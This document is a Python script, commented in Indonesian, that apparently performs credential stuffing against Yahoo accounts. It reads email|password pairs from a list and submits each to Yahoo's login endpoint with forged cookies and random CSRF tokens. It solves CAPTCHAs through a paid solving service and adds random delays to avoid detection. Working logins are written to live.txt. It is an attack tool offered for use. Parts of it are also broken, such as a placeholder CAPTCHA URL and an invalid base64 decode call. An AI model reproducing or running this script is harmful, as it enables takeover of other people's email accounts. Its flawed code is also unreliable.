import imaplib
import time
import random
import requests

email = 'emailmu@yahoo.com'
password = 'passwordmu'

list_file = 'list.txt'
live_file = 'live.txt'
dead_file = 'dead.txt'

# fungsi untuk membaca daftar akun email
def read_list():
    with open(list_file, 'r') as f:
        lines = f.readlines()
        return [line.strip() for line in lines]

# fungsi untuk melakukan login ke email menggunakan imap
def login(email, password):
    try:
        server = imaplib.IMAP4_SSL('imap.mail.yahoo.com')
        server.login(email, password)
        server.logout()
        return True
    except Exception as e:
        return False

# fungsi untuk bypass captcha menggunakan API anti-captcha
def bypass_captcha():
    api_key = 'your_api_key'
    captcha_url = 'https://captcha_url'
    payload = {
        'clientKey': api_key,
        'task': {
            'type': 'ImageToTextTask',
            'body': requests.get(captcha_url).content.decode('base64'),
            'phrase': False,
            'case': False
        }
    }
    response = requests.post('https://api.anti-captcha.com/createTask', json=payload)
    task_id = response.json()['taskId']
    time.sleep(30) # tunggu sebentar agar API selesai memproses captcha
    response = requests.post('https://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
    return response.json()['solution']['text']

# proses utama
if __name__ == '__main__':
    accounts = read_list()
    for account in accounts:
        email, password = account.split('|')
        session = f'{random.randint(1000000000, 9999999999)}'
        csrf = f'{random.randint(1000000000, 9999999999)}'
        captcha = bypass_captcha()
        headers = {
            'x-csrf-token': csrf,
            'cookie': f'dst=.{session}|; '
                      f'tgu=3; '
                      f'path=/; '
                      f'u1=https%253A%252F%252Fwww.yahoo.com; '
                      f'uprof={email}; '
                      f'upr={email}; '
                      f'PRF=t%253D1537223135%2526u%253D%2526e%253D%2526r%253D%2526a%253D%2526de%253D%2526s%253DjDzsTm9..CBnFiVunQcpSHluzaAK62teQjZiYg--%2526sn%253D%2526hp%253D%2526c%253D%2526fs%253D%2526tzo%253D0%2526lang%253D%s; '
                      f'p_e={email}; '
                      f'p=y; '
                      f'belong="{session}"; '
                      f'xb=0; '
                      f'ZOOM=191a17c05a604209bed795035f96a1b7; '
                      f'PRF_PL=interests%252Cshopping%252Cviewed%252Csaved; '
                      f'yvkn=""; '
                      f'PRF_T=t%253D1612840203%2526e%253Dyahoo%2526r%253D%2526pc%253D3430_0129%2526a%253D%2526intl%253Dus%2526b%253Dp_Yahoo_A; '
                      f'ys=""; '
                      f'CF=0; '
                      f'AS=jDzsTm9..CBnFiVunQcpSHluzaAK62teQjZiYg--'
        }
        data = {
            'browser_name': 'Firefox',
            'intl': 'us',
            'language': 'en-US',
            'source': 'printmail',
            'input': '',
            'username': email,
            'passwd': password,
            'signin': 'Next',
            'persistent': 'y',
            'oauth_version': '',
            'device_type': 'desktop',
            'device_name': '',
            'createacc': '',
            'fid': '',
            'specId': '',
            'sessionIndex': '',
            'otpField': '',
            'verificationCode': '',
            'verifyCode': captcha,
            'jsb': 'sessions/false/0.6.0',
            'csrfToken': csrf
        }
        response = requests.post('https://login.yahoo.com/b', headers=headers, data=data)
        if 'https://www.yahoo.com/?guccounter=1' in response.url: # login berhasil
            with open(live_file, 'a') as f:
                f.write(f'{email}|{password}\n')
        else: # login gagal
            with open(dead_file, 'a') as f:
                f.write(f'{email}|{password}\n')
        time.sleep(random.randint(5, 15)) # tunggu sebentar sebelum mencoba akun berikutnya


